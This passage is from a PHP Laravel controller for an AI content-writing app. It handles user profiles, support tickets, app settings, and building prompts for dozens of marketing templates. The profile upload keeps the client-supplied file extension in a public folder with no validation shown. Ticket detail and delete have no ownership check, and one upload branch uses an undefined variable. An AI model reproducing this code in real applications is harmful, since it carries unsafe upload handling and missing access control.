            else
            {
                $user = User::find($request->user_id);
                $user->name = $request->name;
                $user->email = $request->email;
                $user->save();

                if($request->file("image") && $request->file('image')->isValid()) {
                    $destinationPath = './uploads';
                    $extension = $request->file("image")->getClientOriginalExtension();
                    $fileName = Str::uuid() . '.' . $extension;
                    $request->file("image")->move($destinationPath, $fileName);
                    
                    $image = User::find($request->user_id);
                    $image->image = $fileName;
                    $image->save();
                }

                return response()->json([
                    'status' => "Success",
                    'message' => "User Update Successfully",
                ], 200);
            }
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function postContacts(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',
            "subject" => 'required',
            "message" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            Inquiry::create([
                "name" => $request->get("name"),
                "email" => $request->get("email"),
                "subject" => $request->get("subject"),
                "message" => $request->get("message"),
            ]);

            return response()->json([
                'status' => "success",
                'message' => "Message Send Successfully!",
            ], 200);
        }   
    }

    public function create_support_request(Request $request)
    {
        $user = User::find($request->user_id);
        if(!empty($user))
        {
            $validation = Validator::make($request->all(), [
                'priority' => 'required',
                'category' => 'required',
                'subject' => 'required',
                'message' => 'required',
                'attachment' => 'nullable|image|mimes:jpeg,png,jpg|max:5048'
            ]);
    
            if ($validation->fails()) {
                $errors = [];
                foreach ($validation->errors()->messages() as $key => $value) {
                    $errors[] = is_array($value) ? implode(',', $value) : $value;
                }
    
                return response()->json([
                    'status' => "Error",
                    'message' => $errors,
                ], 404);
            } 
            else 
            {
                $ticket_id = strtoupper(Str::random(10));

                $support_ticket = SupportTicket::create([
                    "priority" => htmlspecialchars($request->get("priority")),
                    "user_id" => $request->user_id,
                    "category" => htmlspecialchars($request->get("category")),
                    "subject" => htmlspecialchars($request->get("subject")),
                    "status" => "Open",
                    'ticket_id' => $ticket_id,
                ])->id;

                $support_message = SupportMessage::create([
                    'message' => htmlspecialchars(request('message')),
                    'user_id' => $request->user_id,
                    'ticket_id' => $ticket_id,
                ])->id;

                if ($request->file("attachment") && $request->file('attachment')->isValid()) {
                    $destinationPath = './uploads/support';
                    $extension = $request->file("attachment")->getClientOriginalExtension();
                    $fileName = Str::uuid() . '.' . $extension;
                    $request->file("attachment")->move($destinationPath, $fileName);
                    
                    $file_data = SupportMessage::find($id);
                    $file_data->attachment = $fileName;
                    $file_data->save();
                }

                $date = SupportTicket::find($support_ticket);

                $support_ticket_data = array(
                    "ticketId" => $ticket_id,
                    "status" => "Open",
                    "category" => htmlspecialchars($request->get("category")),
                    "subject" => htmlspecialchars($request->get("subject")),
                    "priority" => htmlspecialchars($request->get("priority")),
                    "lastUpdated" => date('d M Y H:i A',strtotime($date->updated_at)),
                );

                $admin_mail = User::where('user_type','Super Admin')->get();

                foreach($admin_mail as $mail)
                {
                    if($mail->email != "demo2023@gmail.com")
                    {
                        try
                        {
                            $name = $mail->name;
                            Mail::to($mail->email)->send(new SupportTicketMail($ticket_id,$name));
                        }
                        catch(\Exception $e){
                            return response()->json([
                                'status' => "Error",
                                'message' => $e->getmessage(),
                            ], 404);
                        }
                    }
                }

                return $support_ticket_data;
            }
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function support_request_reply(Request $request)
    {
        $user = User::find($request->user_id);
        if(!empty($user))
        {
            $validation = Validator::make($request->all(), [
                'message' => 'required',
                'attachment' => 'nullable|image|mimes:jpeg,png,jpg|max:5048'
            ]);
    
            if ($validation->fails()) {
                $errors = [];
                foreach ($validation->errors()->messages() as $key => $value) {
                    $errors[] = is_array($value) ? implode(',', $value) : $value;
                }
    
                return response()->json([
                    'status' => "Error",
                    'message' => $errors,
                ], 404);
            } 
            else 
            {
                $exist = SupportTicket::where('ticket_id', $request->ticket_id)->first();
                if($exist != null)
                {
                    $ticket = SupportTicket::where('ticket_id', $request->ticket_id)->firstOrFail();
                    $ticket->updated_at = now();
                    $ticket->save();
            
                    $id = SupportMessage::create([
                        'message' => htmlspecialchars($request->message),
                        'user_id' => $request->user_id,
                        'ticket_id' => $request->ticket_id,
                    ])->id; 
        
                    if ($request->file("attachment") && $request->file('attachment')->isValid()) {
                        $destinationPath = './uploads/support';
                        $extension = $request->file("attachment")->getClientOriginalExtension();
                        $fileName = Str::uuid() . '.' . $extension;
                        $request->file("attachment")->move($destinationPath, $fileName);
                        
                        $file_data = SupportMessage::find($id);
                        $file_data->attachment = $fileName;
                        $file_data->save();
                    }
        
                    $message = SupportMessage::where('ticket_id', $request->ticket_id)->get();

                    $message_data = [];

                    foreach ($message as $msg) {
                        $user = User::find($msg->user_id);
                        $message_data[] = array(
                            "type" => ($user->user_type == "Super Admin")?"Admin":"User",
                            "message" => $msg->message,
                            "date" => date('d M Y H:i A',strtotime($msg->created_at)),
                            "image" => ($msg->attachment)?asset('uploads/support/'.$msg->attachment):"",
                        );
                    }

                    $support = SupportTicket::where('ticket_id', $request->ticket_id)->first();

                    $res = array(
                        'ticket_id' => $support->ticket_id,
                        'subject' => $support->subject,  
                        'status' => $support->status,
                        'message' => $message_data,
                    );

                    $admin_mail = User::where('user_type','Super Admin')->get();

                    foreach($admin_mail as $mail)
                    {
                        if($mail->email != "demo2023@gmail.com")
                        {
                            try
                            {
                                $name = $mail->name;
                                $message = htmlspecialchars($request->message);
                                Mail::to($mail->email)->send(new ReplySupportTicketMail($request->ticket_id,$name,$message));
                            }
                            catch(\Exception $e){
                                return response()->json([
                                    'status' => "Error",
                                    'message' => $e->getmessage(),
                                ], 404);
                            }  
                        }
                    }

                    return response()->json($res);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Invalid Ticket Id",
                    ], 404);
                }
            }
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function support_request(Request $request)
    {
        $user = User::find($request->user_id);
        if(!empty($user))
        {
            $data = SupportTicket::where('user_id', $request->user_id)->latest()->get();

            $support_ticket_data = [];

            foreach ($data as $support) {
                $support_ticket_data[] = array(
                    "ticketId" => $support->ticket_id,
                    "status" => $support->status,
                    "category" => $support->category,
                    "subject" => $support->subject,
                    "priority" => $support->priority,
                    "lastUpdated" => date('d M Y H:i A',strtotime($support->updated_at)),
                );
            }
    
            return $support_ticket_data;
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function support_request_detail(Request $request)
    {
        $exist = SupportTicket::where('ticket_id', $request->ticket_id)->first();
        if($exist != null)
        {
            $message = SupportMessage::where('ticket_id', $request->ticket_id)->get();

            $message_data = [];

            foreach ($message as $msg) {
                $user = User::find($msg->user_id);
                $message_data[] = array(
                    "type" => ($user->user_type == "Super Admin")?"Admin":"User",
                    "message" => $msg->message,
                    "date" => date('d M Y H:i A',strtotime($msg->created_at)),
                    "image" => ($msg->attachment)?asset('uploads/support/'.$msg->attachment):"",
                );
            }

            $support = SupportTicket::where('ticket_id', $request->ticket_id)->first();

            $res = array(
                'ticket_id' => $support->ticket_id,
                'subject' => $support->subject,  
                'status' => $support->status,
                'message' => $message_data,
            );

            return response()->json($res);
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Ticket Id",
            ], 404);
        }
    }

    public function support_request_delete(Request $request)
    {
        $exist = SupportTicket::where('ticket_id', $request->ticket_id)->first();
        if($exist != null)
        {
            $ticket = SupportTicket::where('ticket_id', $request->ticket_id)->firstOrFail(); 
            $ticket->delete();
            SupportMessage::where('ticket_id', $request->ticket_id)->delete(); 

            return response()->json([
                'status' => "Success",
                'message' => "Support Request Delete Success!",
            ], 200);
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Ticket Id",
            ], 404);
        }
    }

    public function getAppAbout(Request $request)
    {
        $appSetting = Setting::all();
        $adsSetting = AdsSetting::all();
        $paymentSetting = PaymentSetting::all();
        $appUpdateSetting = AppUpdateSetting::all();
        $otherSetting = OtherSetting::all();
        $data = [];

        foreach ($appSetting as $s) 
        {
            if($s->key_name != "favicon" && $s->key_name != "white_logo" && $s->key_name != "black_logo" && $s->key_name != "openai_key" && $s->key_name != "openai_model" && $s->key_name != "licence_active" && $s->key_name != "header_script"  && $s->key_name != "offer_section_enable" && $s->key_name != "footer_text" && $s->key_name != "register_user_default_word" && $s->key_name != "register_user_default_image" && $s->key_name != "api_key")
            {
                $data[$this->from_camel_case($s->key_name)] = $s->key_value;
            }
        }

        foreach($adsSetting as $ads) 
        {
            $data[$this->from_camel_case($ads->key_name)] = $ads->key_value;
        }

        foreach ($paymentSetting as $s) 
        {
            $data[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        foreach ($appUpdateSetting as $s) 
        {
            $update[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        $data['appUpdate'] = $update;

        foreach ($otherSetting as $s) 
        {
            if($s->key_name != "about_us")
            {
                $data[$this->from_camel_case($s->key_name)] = $s->key_value;
            }
        }

        if($request->user_id)
        {
            $user = User::where('id',$request->user_id)->where('is_deleted',0)->first();
            if($user)
            {
                $user_status = User::where('id',$request->user_id)->where('status',1)->first();
                if($user_status)
                {
                    $data['userStatus'] = "Active";
                }
                else
                {
                    $data['userStatus'] = "Disable";
                }
            }
            else
            {
                $data['userStatus'] = "Deleted User";
            }
        }         
        else
        {
            $data['userStatus'] = "Deleted User";
        }

        return $data;   
    }

    public function from_camel_case($str) {
        $i = array("-","_");
        $str = preg_replace('/([a-z])([A-Z])/', "\\1 \\2", $str);
        $str = preg_replace('@[^a-zA-Z0-9\-_ ]+@', '', $str);
        $str = str_replace($i, ' ', $str);
        $str = str_replace(' ', '', ucwords(strtolower($str)));
        $str = strtolower(substr($str,0,1)).substr($str,1);
        return $str;
    }

    public function generate_templates(Request $request)
    {
        $templates = Templates::where('id',$request->template_id)->where('status',1)->first();
        if($templates != null)
        {
            if($templates->title == "Linkedin Post")
            {
                $instruction = $request->instruction;
                $outputs = $request->outputs;
                $voice = $request->voice;
                $emoji = $request->emoji;
                $language = $request->language;
                $words = $request->words;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt= "Write ".$outputs." ".$voice." Linkedin Post Up to ".$words." words in ".$language." for ".$instruction." with emoji";
                }
                else
                {
                    $prompt= "Write ".$outputs." ".$voice." Linkedin Post Up to ".$words." words in ".$language." for ".$instruction;
                }
            }
            if($templates->title == "Instagram Caption")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $voice = $request->voice;
                $emoji = $request->emoji;
                $language = $request->language;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt= "Write ".$outputs." ".$voice." Instagram Caption in ".$language." for ".$description." with emoji";
                }
                else
                {
                    $prompt= "Write ".$outputs." ".$voice." Instagram Caption in ".$language." for ".$description;
                }
            }
            if($templates->title == "Twitter Tweets")
            {
                $topic = $request->topic;
                $outputs = $request->outputs;
                $emoji = $request->emoji;
                $language = $request->language;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt= "Generate ".$outputs." Twitter Tweets in ".$language." to ".$topic." with emoji";
                }
                else
                {
                    $prompt= "Generate ".$outputs." Twitter Tweets in ".$language." to ".$topic;
                }
            }
            if($templates->title == "Trending Instagram Hashtags")
            {
                $topic = $request->topic;
                $no_of_hashtags = $request->no_of_hashtags;
                $document_name = $request->document_name;

                $prompt= "Give ".$no_of_hashtags." Trending Instagram Hashtags for ".$topic;
            }
            if($templates->title == "Youtube Video Description")
            {
                $video_title = $request->video_title;
                $outputs = $request->outputs;
                $voice = $request->voice;
                $emoji = $request->emoji;
                $language = $request->language;
                $words = $request->words;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt= "Write ".$outputs." ".$voice." Youtube Video Description Up to ".$words." words in ".$language." for ".$video_title." use these keywords ".$keywords." with emoji";
                }
                else
                {
                    $prompt= "Write ".$outputs." ".$voice." Youtube Video Description Up to ".$words." words in ".$language." for ".$video_title." use these keywords ".$keywords;
                }
            }
            if($templates->title == "Youtube Video Ideas")
            {
                $video_topic = $request->video_topic;
                $outputs = $request->outputs;
                $language = $request->language;
                $search_term = $request->search_term;
                $document_name = $request->document_name;

                $prompt= "Give ".$outputs." Youtube Video Ideas in ".$language." for ".$video_topic." related to ".$search_term;
            }
            if($templates->title == "Youtube Video Outlines")
            {
                $video_topic = $request->video_topic;
                $language = $request->language;
                $search_term = $request->search_term;
                $document_name = $request->document_name;

                $prompt= "Give Youtube Video Outlines in ".$language." for ".$video_topic." related to ".$search_term;
            }
            if($templates->title == "Youtube Video Title")
            {
                $video_description = $request->video_description;
                $outputs = $request->outputs;
                $emoji = $request->emoji;
                $language = $request->language;
                $search_term = $request->search_term;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt= "Suggest ".$outputs." Youtube Video Title in ".$language." for ".$search_term." related to ".$video_description." with emoji";
                }
                else
                {
                    $prompt= "Suggest ".$outputs." Youtube Video Title in ".$language." for ".$search_term." related to ".$video_description;
                }
            }
            if($templates->title == "Youtube Video Tag")
            {
                $video_title = $request->video_title;
                $no_of_tags = $request->no_of_tags;
                $document_name = $request->document_name;

                $prompt= "Suggest ".$no_of_tags." Youtube Video Tag for ".$video_title." with coma, no number";
            }
            if($templates->title == "TikTok Video Scripts")
            {
                $description = $request->description;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write TikTok Video Scripts in ".$language." for ".$description;
            }
            if($templates->title == "Youtube Video Scripts")
            {
                $title = $request->title;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write Youtube Video Scripts in ".$language." for ".$title;
            }
            if($templates->title == "Instagram Reel Scripts")
            {
                $title = $request->title;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write Instagram Reel Scripts in ".$language." for ".$title;
            }
            if($templates->title == "Youtube Short Scripts")
            {
                $title = $request->title;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write Youtube Short Scripts in ".$language." for ".$title;
            }
            if($templates->title == "Pin Title & Description")
            {
                $topic = $request->topic;
                $about = $request->about;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt= "Write ".$outputs." Pin Title and Pin Description in ".$language." for ".$topic." related to ".$about." use keywords ".$keywords;
            }
            if($templates->title == "Social Media Content Plan")
            {
                $objective = $request->objective;
                $outputs = $request->outputs;
                $emoji = $request->emoji;
                $platform = $request->platform;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt= "Generate ".$outputs." Social Media Content Plan for ".$platform." Related To ".$objective." Use Objective, Strategy, Timeline with emoji";
                }
                else
                {
                    $prompt= "Generate ".$outputs." Social Media Content Plan for ".$platform." Related To ".$objective." Use Objective, Strategy, Timeline";
                }
            }
            if($templates->title == "Pinterest Board Ideas")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $topic_idea = $request->topic_idea;
                $document_name = $request->document_name;

                $prompt= "Create a list of ".$outputs." Pinterest board ideas in ".$language." for the following theme or niche: ".$topic_idea.". Suggest engaging board titles and descriptions for each.";
            }
            if($templates->title == "Pinterest Pin ideas")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $topic_idea = $request->topic_idea;
                $document_name = $request->document_name;

                $prompt= "Provide ".$outputs." Pinterest pin ideas in ".$language." for the following topic: ".$topic_idea.". Include captivating titles and descriptions for each pin.";
            }
            if($templates->title == "Board Descriptions")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $title = $request->title;
                $document_name = $request->document_name;

                $prompt= "Write ".$outputs." SEO-friendly board descriptions in ".$language." for the following Pinterest board titles: ".$title.".";
            }
            if($templates->title == "Pin Group Ideas")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $theme = $request->theme;
                $document_name = $request->document_name;

                $prompt= "Create a list of ".$outputs." Pinterest pin group ideas in ".$language." for the following theme or niche: ".$theme.". Suggest engaging group titles and descriptions for each.";
            }
            if($templates->title == "Snapchat Content Ideas")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $theme = $request->theme;
                $document_name = $request->document_name;

                $prompt= "Create a list of ".$outputs." engaging Snapchat content ideas in ".$language." for the following theme or niche: ".$theme.". Suggest captivating captions and relevant hashtags for each.";
            }
            if($templates->title == "Snapchat Story Series")
            {
                $language = $request->language;
                $theme = $request->theme;
                $document_name = $request->document_name;

                $prompt= "Outline a Snapchat Story series in ".$language." for the following theme or niche: ".$theme.". Include a brief overview of the series and suggested content topics.";
            }
            if($templates->title == "Snapchat Spotlight Ideas")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $theme = $request->theme;
                $document_name = $request->document_name;

                $prompt= "Provide ".$outputs." Snapchat Spotlight ideas in ".$language." for the following theme or niche: ".$theme.". Include captivating captions and relevant hashtags for each.";
            }

            if($templates->title == "AIDA Copywriting Frame")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write an Attention-Interest-Desire-Action Copywriting Framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "PAS Copywriting Frame")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Problem-Agitate-Solution Copywriting Framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "Marketing USP")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Generate a Unique-Selling-Point in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "BAB Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Before - After - Bridge Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "FAB Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Features - Advantages - Benefits Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "The 4 C Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Clear - Concise - Compelling - Credible Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "FOREST Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Facts - Opinions - Repetition - Examples - Statistics - Threes Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "5 Basic Objections Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a 5 Basic Objections Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "The PPPP Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Picture - Promise - Prove - Push Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "The SCH Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Star - Chain - Hook Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "The SSS Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Star - Story - Solution Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "PASTOR Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Problem - Agitate - Solution - Transformation - Offer - Response Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "ACCA Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write an Awareness - Comprehension - Conviction - Action Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "1-2-3-4 Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a 1–2–3–4 Formula Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "6+1 Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a 6+1 Formula Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "SLAP Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write a Stop - Look - Act - Purchase Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }
            if($templates->title == "4U Copywriting Framework")
            {
                $product_name = $request->product_name;
                $about_product = $request->about_product;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt= "Write an Urgent, Unique, Useful, and Ultra-specific Copywriting framework in ".$language." for ".$product_name." related To ".$about_product;
            }

            if($templates->title == "Facebook Ads")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $voice = $request->voice;
                $emoji = $request->emoji;
                $language = $request->language;
                $product_name = $request->product_name;
                $promotion = $request->promotion;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write ".$outputs." ".$voice." Facebook Ads Copy in ".$language." for ".$product_name." Related to ".$description." use ".$promotion." off with emoji";
                }
                else
                {
                    $prompt = "Write ".$outputs." ".$voice." Facebook Ads Copy in ".$language." for ".$product_name." Related to ".$description." use ".$promotion." off";
                }
            }
            if($templates->title == "Linkedin Ads Headline")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $voice = $request->voice;
                $language = $request->language;
                $product_name = $request->product_name;
                $promotion = $request->promotion;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." ".$voice." Linkedin Ads Headline in ".$language." for ".$product_name." Related to ".$description." use ".$promotion." off";
            }
            if($templates->title == "Linkedin Ads Description")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $no_of_characters = $request->no_of_characters;
                $product_name = $request->product_name;
                $promotion = $request->promotion;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." Linkedin Ads Description in ".$language." for ".$product_name." Related to ".$description." with ".$promotion." off and use keywords ".$keywords." write max ".$no_of_characters." characters";
            }
            if($templates->title == "Google Ads Titles")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." Google Ads up to 30 characters Headline in ".$language." for ".$product_name." related ".$description." use keywords ".$keywords;
            }
            if($templates->title == "Google Ads Description")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $emoji = $request->emoji;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write ".$outputs." Google Ads upto 90 characters Description in ".$language." for ".$product_name." related ".$description." use keywords ".$keywords." with emoji";
                }
                else
                {
                    $prompt = "Write ".$outputs." Google Ads upto 90 characters Description in ".$language." for ".$product_name." related ".$description." use keywords ".$keywords;
                }
            }
            if($templates->title == "App & SMS Notification")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." Notification in ".$language." for ".$description;
            }
            if($templates->title == "Pinterest Ad Campaign")
            {
                $language = $request->language;
                $product_service = $request->product_service;
                $document_name = $request->document_name;

                $prompt = "Outline a Pinterest ad campaign in ".$language." for the following product or service: ".$product_service.". Include ad creatives, targeting options, and a clear call-to-action.";
            }

            if($templates->title == "Product Description")
            {
                $product_about = $request->product_about;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $emoji = $request->emoji;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write an Introduction, Features, Specifications, How it Works, Faq, Conclusion and 3 Reviews for product description in ".$language." for ".$product_name." Related to ".$product_about." use these keywords ".$keywords." with emoji";
                }
                else
                {
                    $prompt = "Write an Introduction, Features, Specifications, How it Works, Faq, Conclusion and 3 Reviews for product description in ".$language." for ".$product_name." Related to ".$product_about." use these keywords ".$keywords;
                }
            }
            if($templates->title == "AIDA Framework")
            {
                $description = $request->description;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write AIDA in ".$language." for ".$description;
            }
            if($templates->title == "Amazon Product Description (Paragraph)")
            {
                $no_of_paragraph = $request->no_of_paragraph;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$no_of_paragraph." paragraph for Product Description in ".$language." for ".$product_name." use keywords ".$keywords;
            }
            if($templates->title == "Amazon Product Feature (Bullet)")
            {
                $no_of_bullet = $request->no_of_bullet;
                $language = $request->language;
                $product_name = $request->product_name;
                $document_name = $request->document_name;

                $prompt = "Write ".$no_of_bullet." Product Feature in ".$language." for ".$product_name." with bullet list";
            }
            if($templates->title == "Content Improver")
            {
                $content = $request->content;
                $document_name = $request->document_name;

                $prompt = "Rewrite content ".$content;
            }
            if($templates->title == "SEO Title and Meta Description")
            {
                $keywords = $request->keywords;
                $language = $request->language;
                $product_name = $request->product_name;
                $document_name = $request->document_name;

                $prompt = "Write Title and Meta Description in ".$language." for ".$product_name." use keywords ".$keywords;
            }
            if($templates->title == "Amazon Product Title")
            {
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." Product Title in ".$language." for ".$product_name." Related to ".$product_description." use keywords ".$keywords;
            }
            if($templates->title == "Amazon Sponsered Brand Ad Headline")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." Amazon Ad Headline in ".$language." for ".$product_name." use keywords ".$keywords;
            }
            if($templates->title == "Flipkart Product Title")
            {
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write ".$outputs." Product Title in ".$language." for ".$product_name." related to ".$product_description." use keywords ".$keywords;
            }
            if($templates->title == "Flipkart Product Description")
            {
                $no_of_paragraph = $request->no_of_paragraph;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$no_of_paragraph." paragraph for Product Description in ".$language." for ".$product_name." use keywords ".$keywords;
            }
            if($templates->title == "Product Names")
            {
                $product_about = $request->product_about;
                $outputs = $request->outputs;
                $language = $request->language;
                $product_name = $request->product_name;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Generate ".$outputs." product names in ".$language." for ".$product_name." related to ".$product_about." use keywords ".$keywords;
            }

            if($templates->title == "Article Writer")
            {
                $words = $request->words;
                $title = $request->title;
                $language = $request->language;
                $emoji = $request->emoji;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write ".$words." words Seo Friendly Blog Post in ".$language." for ".$title." use keywords ".$keywords." use Heading, List, FAQ, Conclusion with emoji";
                }
                else
                {
                    $prompt = "Write ".$words." words Seo Friendly Blog Post in ".$language." for ".$title." use keywords ".$keywords." use Heading, List, FAQ, Conclusion";
                }
            }
            if($templates->title == "Blog Post Topic Ideas")
            {
                $no_of_ideas = $request->no_of_ideas;
                $title = $request->title;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Give us ".$no_of_ideas." Blog Post Topic Ideas in ".$language." for ".$title." use keywords ".$keywords;
            }
            if($templates->title == "Blog Post Outlines")
            {
                $title = $request->title;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write Blog Post Outlines in ".$language." for ".$title;
            }
            if($templates->title == "Blog Post Intro Paragraph")
            {
                $title = $request->title;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write a Blog Post Intro Paragraph in ".$language." for ".$title;
            }
            if($templates->title == "Blog Post Conclusion Paragraph")
            {
                $title = $request->title;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write a Blog Post Conclusion Paragraph in ".$language." for ".$title;
            }
            if($templates->title == "FAQ Generator")
            {
                $title = $request->title;
                $language = $request->language;
                $no_of_faq = $request->no_of_faq;
                $document_name = $request->document_name;

                $prompt = "Generator ".$no_of_faq." FAQ in ".$language." for ".$title;
            }
            if($templates->title == "Content Rewriter")
            {
                $content = $request->content;
                $document_name = $request->document_name;

                $prompt = "Content Rewriter for ".$content;
            }
            if($templates->title == "Content Rephrase")
            {
                $content = $request->content;
                $document_name = $request->document_name;

                $prompt = "Content Rephrase for ".$content;
            }
            if($templates->title == "Text Summarizer")
            {
                $content = $request->content;
                $document_name = $request->document_name;

                $prompt = "Text Summarize for ".$content;
            }
